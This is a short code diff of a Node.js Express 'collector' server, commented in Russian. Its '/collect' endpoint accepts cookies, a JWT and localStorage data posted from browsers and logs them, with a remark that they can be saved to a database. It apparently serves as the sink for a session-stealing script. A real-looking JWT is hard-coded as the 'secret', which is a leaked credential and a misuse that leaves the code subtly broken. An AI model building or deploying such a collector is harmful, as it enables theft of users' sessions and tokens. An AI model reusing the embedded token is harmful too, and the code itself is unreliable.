@@ -3,7 +3,7 @@ const express = require('express');
 const jwtLib = require('jsonwebtoken');
 const app = express();
 
-// 🔑 Секрет для верификации JWT (замените на ваш)
+// 🔑 Секрет для верификации JWT (замените на ваш реальный секрет)
 const JWT_SECRET = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2dnZHJvcC5yZWQvYXBpL2F1dGgvZGFzaGJvYXJkIiwiaWF0IjoxNzUzNzcyOTgwLCJuYmYiOjE3NTM3NzI5ODAsImp0aSI6Im9ZRWF1b01pbmxXdkZqd24iLCJzdWIiOjQ2MzQyMzUsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.gmoaE4ylS4vH6d13BRKCFGFfenxPHDt75yDBkN8umR8';
 
 // 1. Разрешаем CORS и парсим JSON
@@ -18,7 +18,7 @@ app.use((req, res, next) => {
 
 // 2. Обработчик сбора данных
 app.post('/collect', (req, res) => {
-  const { cookies, jwt, storage, timestamp } = req.body;
+  const { cookies = [], jwt = null, storage = {}, timestamp = null } = req.body;
 
   // 2.1. Проверка JWT (если пришёл)
   let validJwt = false;
@@ -36,9 +36,9 @@ app.post('/collect', (req, res) => {
   console.log('JWT valid:', validJwt);
   console.log('Cookies:', cookies);
   console.log('LocalStorage keys:', Object.keys(storage));
-  // (При желании можно сохранять в БД или в файл)
+  // Здесь можно сохранять данные в БД или файл
 
-  // 2.3. Ответ клиенту
+  // 2.3. Отвечаем клиенту
   return res.json({
     status: 'ok',
     jwtValid: validJwt,
@@ -52,3 +52,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Collector server listening on port ${PORT}`);
 });
+
